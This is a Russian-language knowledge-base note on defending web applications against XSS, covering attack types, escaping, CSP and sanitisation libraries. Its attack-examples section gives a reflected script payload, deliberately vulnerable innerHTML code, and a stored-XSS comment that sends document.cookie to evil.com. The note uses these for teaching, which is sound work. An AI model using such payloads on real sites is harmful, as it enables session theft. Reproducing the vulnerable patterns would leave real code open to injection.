---
aliases: ["XSS", "Cross-Site Scripting", "Межсайтовый скриптинг", "Защита от XSS"]
tags: ["#security", "#xss", "#web-security", "#frontend-security", "#injection"]
---

# Защита от XSS

**Cross-Site Scripting (XSS)** — это тип уязвимости, при котором злоумышленник вставляет вредоносный скрипт в веб-страницу, который затем выполняется в браузере других пользователей. Это может привести к краже учетных данных, перенаправлению на вредоносные сайты или выполнению действий от имени пользователя.

## Типы XSS-атак

### 1. Reflected XSS (Отраженный XSS)

Происходит, когда вредоносный скрипт передается через URL или форму и отражается на странице. Это обычно одноразовая атака, требующая участия пользователя (например, клика по ссылке).

### 2. Stored XSS (Хранимый XSS)

Происходит, когда вредоносный скрипт сохраняется на сервере (например, в комментариях, сообщениях) и затем отображается другим пользователям.

### 3. DOM-based XSS (Основанный на DOM XSS)

Происходит, когда вредоносный скрипт манипулирует DOM-деревом на стороне клиента, без передачи данных на сервер.

## Примеры XSS-атак

### Reflected XSS

```html
<!-- Страница echo.php -->
<?php echo $_GET['message']; ?>
```

```html
<!-- Злоумышленник отправляет ссылку: -->
https://victim.com/echo.php?message=<script>alert('XSS')</script>
```

### Stored XSS

```html
<!-- Комментарий пользователя сохраняется в базе данных без фильтрации -->
<p>Полезный комментарий<script>document.location='https://evil.com/steal?cookie='+document.cookie</script></p>
```

### DOM-based XSS

```html
<script>
  // Уязвимый код на клиенте
  var userMessage = document.URL.split("message=")[1];
  document.getElementById("output").innerHTML = userMessage;
</script>
```

## Методы защиты от XSS

### 1. Экранирование и санитизация данных

Всегда экранируйте данные перед их вставкой в HTML. Используйте безопасные методы для вставки контента.

#### Неправильно:

```javascript
// Уязвимо к XSS
function displayUserInput(input) {
  document.getElementById('output').innerHTML = input;
}
```

#### Правильно:

```javascript
// Безопасно
function displayUserInput(input) {
  document.getElementById('output').textContent = input;
}
```

### 2. Использование шаблонизаторов с автоматическим экранированием

Современные фреймворки и шаблонизаторы (React, Vue, Handlebars) автоматически экранируют данные при вставке в DOM.

```jsx
// React автоматически экранирует данные
function UserComment({ comment }) {
  return <div>{comment}</div>; // comment будет экранирован
}
```

### 3. Content Security Policy (CSP)

CSP — это механизм безопасности, который помогает предотвратить XSS, ограничивая источники, из которых могут загружаться ресурсы (скрипты, стили и т.д.).

```html
<!-- Заголовок CSP -->
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### 4. Правильная обработка URL и параметров

При работе с URL и параметрами всегда проверяйте и фильтруйте данные:

```javascript
// Безопасная обработка параметров URL
function getParameterByName(name) {
  const urlParams = new URLSearchParams(window.location.search);
  const paramValue = urlParams.get(name);
  // Экранируем значение перед использованием
  return paramValue ? escapeHtml(paramValue) : null;
}

function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}
```

### 5. Санитизация HTML-контента

Если необходимо вставлять HTML-контент от пользователей, используйте библиотеки санитизации:

```javascript
// Использование DOMPurify для санитизации HTML
import DOMPurify from 'dompurify';

const dirty = '<p>Пользовательский контент<script>alert("XSS")</script></p>';
const clean = DOMPurify.sanitize(dirty);
document.getElementById('content').innerHTML = clean;
```

## Практические рекомендации

### 1. Не доверяйте пользовательским данным

Все данные, поступающие от пользователей, должны считаться потенциально вредоносными.

### 2. Используйте безопасные методы вставки данных

- `textContent` вместо `innerHTML`
- `setAttribute` для установки значений атрибутов
- Шаблонизаторы с автоматическим экранированием

### 3. Проверяйте и валидируйте данные

Проверяйте все входные данные на соответствие ожидаемому формату.

### 4. Обновляйте зависимости

Регулярно обновляйте библиотеки и фреймворки, чтобы устранять известные уязвимости.

## Примеры безопасного кода

### Безопасная вставка данных в форму

```javascript
// Правильно: безопасная вставка данных в форму
function fillForm(userData) {
  document.getElementById('username').value = userData.username;
  document.getElementById('email').value = userData.email;
  // Не используем innerHTML для вставки пользовательских данных
}
```

### Безопасная обработка URL

```javascript
// Правильно: безопасная обработка URL-параметров
function processUrlParams() {
  const params = new URLSearchParams(window.location.search);
  const message = params.get('message');
  
  if (message) {
    // Экранируем и проверяем данные перед использованием
    const safeMessage = escapeHtml(message);
    document.getElementById('message').textContent = safeMessage;
  }
}
```

## Связанные темы

- [[OWASP-Top-10]]
- [[CORS-и-безопасность]]
- [[Защита-от-CSRF]]
- [[HTTPS-и-шифрование]]

## Заключение

XSS — одна из самых распространенных и опасных уязвимостей веб-приложений. Фронтенд-разработчики должны быть особенно внимательны при работе с пользовательскими данными и всегда использовать безопасные методы для их обработки и отображения.

> [!tip] Совет
> Используйте инструменты статического анализа кода и автоматизированные сканеры уязвимостей для выявления потенциальных XSS-уязвимостей в вашем коде.

> [!warning] Важно
> Даже если вы используете фреймворк с автоматическим экранированием, всегда проверяйте, что данные обрабатываются правильно, особенно при использовании `dangerouslySetInnerHTML` в React или аналогичных функций.